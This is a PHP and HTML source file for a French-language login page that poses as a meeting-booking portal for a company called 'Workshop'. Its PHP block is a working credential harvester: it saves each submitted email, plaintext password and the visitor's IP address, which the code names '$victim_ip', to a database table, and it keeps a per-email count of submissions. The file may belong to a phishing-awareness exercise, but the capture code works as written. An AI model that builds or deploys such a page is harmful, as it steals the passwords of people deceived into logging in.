<?php

    if (isset($_POST['email']) && isset($_POST['password'])) {
        require('../db/db.php');

        $email = $_POST['email'];
        $password = $_POST['password'];
        $victim_ip = $_SERVER['REMOTE_ADDR'];
        $page_id = 1;
        $counter = null;

        $sql1 = "SELECT email, password, counter FROM page_views_workshop";
        $stmt = $conn->prepare($sql1);
        $stmt->execute();
        $results = $stmt->fetchAll();

        foreach ($results as $result) {
            if ($result['email'] === $email) {
                $result['counter'] += 1;

                $sql2 = "UPDATE page_views_workshop SET counter = :counter WHERE email = :email";

                $stmt2 = $conn->prepare($sql2);
                $stmt2->execute(array(
                        ':counter' => $result['counter'],
                        ':email' => $result['email']
                ));
            } else {
                $result['counter'] = 1;

                $sql3 = "INSERT INTO page_views_workshop(visitor_ip, email, password, page_id, counter) VALUES(:victim_ip, :email, :password, :page_id, :counter);";

                $stmt3 = $conn->prepare($sql3);
                $stmt3->execute(array(
                    ':victim_ip' => $victim_ip,
                    ':email' => $email,
                    ':password' => $password,
                    ':page_id' => $page_id,
                    ':counter' => $result['counter']
                ));
            }
        }

        $stmt->closeCursor();
    }
?>
<!------ Include the above in your HEAD tag ---------->

<!DOCTYPE html>
<html>
<head>
    <title>Prise de rendez-vous réunion</title>
    <link href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
    <link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>
    <div class="infobulle">
       <p>Veuillez vous identifier pour accéder aux informations.</p>
    </div>
    <div class="container">
        <div class="card card-container w-50">
            <img id="profile-img" class="profile-img-card" src="workshop.jpg" alt="Logo entreprise Workshop" />
            <p id="profile-name" class="profile-name-card"></p>
            <form class="form-signin" action="index.php" method="post">
                <span id="reauth-email" class="reauth-email"></span>
                <input type="email" id="inputEmail" class="form-control" placeholder="email" name="email" required autofocus>
                <input type="password" id="inputPassword" class="form-control" placeholder="mot de passe" name="password" required>
                <div id="remember" class="checkbox">
                    <label>
                        <input type="checkbox" value="remember-me"> Rester connecté
                    </label>
                </div>
                <button class="btn btn-lg btn-primary btn-block btn-signin" type="submit">Se connecter</button>
            </form><!-- /form -->
        </div><!-- /card-container -->
    </div><!-- /container -->
    <script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
    <script src="//code.jquery.com/jquery-1.11.1.min.js"></script>
    <script src="style.js"></script>
</body>
</html>
